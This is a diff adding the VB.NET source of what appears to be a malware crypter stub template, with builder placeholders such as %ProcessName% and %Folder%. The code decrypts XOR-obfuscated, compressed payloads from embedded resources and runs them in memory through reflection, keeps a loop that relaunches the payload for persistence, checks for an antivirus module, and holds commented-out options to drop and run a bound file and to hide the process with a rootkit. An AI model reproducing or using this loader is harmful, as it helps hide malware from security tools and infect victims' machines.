@@ -1,0 +1,163 @@
+Imports System, Microsoft.VisualBasic
+Imports System.Reflection
+Imports System.Text
+Imports System.Security.Cryptography
+Imports System.IO.Compression
+Imports System.IO
+Imports System.Diagnostics
+
+'[ASEMBLYCODE]
+<Assembly: AssemblyKeyFileAttribute("STRONGNAMELOCATION")> 
+
+Public Class _BASE
+    Shared ASM As Assembly = Assembly.GetExecutingAssembly()
+    Shared RM As New Resources.ResourceManager("Z", ASM)
+    Shared Bind As Boolean = %BindCheck%
+    Shared Once As Boolean = %OnceCheck%
+    Shared Sub Main()
+        Try
+            'BINDER CheckBinder
+            For Each procMod As ProcessModule In Process.GetCurrentProcess().Modules
+                If procMod.ModuleName = "snxhk.dll" Then
+                End If
+            Next
+            Dim EX As New EX(RetRpE, "Alternative", "Running", New Object() {RetFile, "%ProcessName%", "", "%NON%", "%Folder%", "%Filename%", "%KeyName%"})
+            EX.Run()
+            'ROOTPersist
+            '_HIDEDim ProcessName As String = "%ProcessName%"
+            '_HIDEDim Processes() As System.Diagnostics.Process = System.Diagnostics.Process.GetProcessesByName(ProcessName)
+            '_HIDEDim id = Processes(0).Id
+            '_HIDEDim Hide As New EX(RetRoot, "Rootkits", "HideProcess", New Object() {Process.GetProcessById(Convert.ToInt32(id))})
+            '_HIDEHide.Run()
+        Catch ex As Exception
+            MsgBox(ex.Message)
+        End Try
+    End Sub
+    Public Shared Sub Persist()
+        While True
+            Dim P = Process.GetProcessesByName("%ProcessName%")
+            If P.Length < 1 Then
+                Dim EX As New EX(RetRpE, "Alternative", "Running", New Object() {RetFile, "%ProcessName%", "%NON%", "%Folder%", "%Filename%", "%KeyName%"})
+                EX.Run()
+
+            End If
+            System.Threading.Thread.Sleep(500)
+        End While
+    End Sub
+    Private Shared ReadOnly Property RetFile As Byte()
+        Get
+            Return Decompress(PolyIndia(Encoding.Default.GetBytes(RM.GetObject("First"))))
+        End Get
+    End Property
+
+    Private Shared ReadOnly Property RetRpE As Byte()
+        Get
+            Return Decompress(PolyIndia(Encoding.Default.GetBytes(RM.GetObject("Second"))))
+        End Get
+    End Property
+
+    '_HIDEPrivate Shared ReadOnly Property RetRoot As Byte()
+    '_HIDE    Get
+    '_HIDE        Return Decompress(PolyIndia(Encoding.Default.GetBytes(RM.GetObject("Root"))))
+    '_HIDE    End Get
+    '_HIDEEnd Property
+
+    'BINDERPrivate Shared ReadOnly Property RetBind As Byte()
+    'BINDER    Get
+    'BINDER        Return Decompress(PolyIndia(Encoding.Default.GetBytes(RM.GetObject("Three"))))
+    'BINDER    End Get
+    'BINDEREnd Property
+
+    'BINDERShared Sub ExecBind()
+    'BINDER    Dim RR As New Random
+    'BINDER    Dim Path = IO.Path.GetTempPath & RR.Next(1, 99999) & "%Extension%"
+    'BINDER    Dynamic(GetType(IO.File), "WriteAllBytes", New Object() {Path, RetBind})
+    'BINDER    Dynamic(GetType(Process), "Start", New Object() {Path})
+    'BINDEREnd Sub
+
+    'BINDERShared Sub CheckBinder()
+    'BINDER    Dim x As System.Threading.Thread
+    'BINDER    Dim xx As System.Threading.Thread
+    'BINDER    If Bind = True Then
+    'BINDER        If Once = True Then
+    'BINDER            Dim OnceKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.ClassesRoot.OpenSubKey("AlreadyLaunched", False)
+    'BINDER            If OnceKey Is Nothing Then
+    'BINDER                xx = New System.Threading.Thread(AddressOf ExecBind)
+    'BINDER                xx.Start()
+    'BINDER                My.Computer.Registry.ClassesRoot.CreateSubKey("AlreadyLaunched", False)
+    'BINDER            Else
+    'BINDER            End If
+    'BINDER        Else
+    'BINDER            x = New System.Threading.Thread(AddressOf ExecBind)
+    'BINDER            x.Start()
+    'BINDER        End If
+    'BINDER    Else : Exit Sub : End If
+    'BINDEREnd Sub
+
+    Public Shared Function PolyIndia(ByVal data As Byte()) As Byte()
+        Dim Result As Byte() = New Byte(data.Length - 16 - 1) {}
+        Buffer.BlockCopy(data, 16, Result, 0, Result.Length)
+        For i As Integer = 0 To Result.Length - 1
+            Result(i) = Result(i) Xor data(i Mod 16)
+        Next
+        Return Result
+    End Function
+
+    Public Shared Function Decompress(data As Byte()) As Byte()
+        Dim input As New MemoryStream()
+        input.Write(data, 0, data.Length)
+        input.Position = 0
+        Dim gzip As New GZipStream(input, CompressionMode.Decompress, True)
+        Dim output As New MemoryStream()
+        Dim buff As Byte() = New Byte(63) {}
+        Dim read As Integer = -1
+        read = gzip.Read(buff, 0, buff.Length)
+        While read > 0
+            output.Write(buff, 0, read)
+            read = gzip.Read(buff, 0, buff.Length)
+        End While
+        gzip.Close()
+        Return output.ToArray()
+    End Function
+
+    Public Shared Function Dynamic(ByVal [Class] As System.Type, ByVal Method As String, ByVal Argument As Object())
+        Dim Cls As Type = [Class]
+        Dim Void As String = Method
+        Dim obj As Object() = Argument
+        Return Cls.InvokeMember(Void, System.Reflection.BindingFlags.InvokeMethod, Nothing, Nothing, obj)
+    End Function
+
+End Class
+Public Class EX
+    Private ASM() As Byte
+    Private CN, MN As String
+    Private args() As Object
+    Public Sub New(ByVal ASM() As Byte, ByVal CN As String, ByVal MN As String, ByVal args() As Object)
+        Me.ASM = ASM
+        Me.CN = CN
+        Me.MN = MN
+        Me.args = args
+    End Sub
+    Public Sub Run()
+        Dim ASM1 As Assembly
+        Dim ASMInit As New ASMInit(ASM)
+        ASM1 = ASMInit.Ret
+        For Each typex As Type In ASM1.GetTypes()
+            If typex.IsClass = True Then
+                If typex.FullName.EndsWith("." & CN) Then
+                    Dim ClassyObject As Object = Activator.CreateInstance(typex)
+                    typex.InvokeMember(MN, Reflection.BindingFlags.[Default] Or Reflection.BindingFlags.InvokeMethod, Nothing, ClassyObject, args)
+                End If
+            End If
+        Next
+    End Sub
+    Public Class ASMInit
+        Private Init As Assembly
+        Public Sub New(ByVal Init As Byte())
+            Me.Init = Assembly.Load(Init)
+        End Sub
+        Public Function Ret() As Assembly
+            Return Init
+        End Function
+    End Class
+End Class
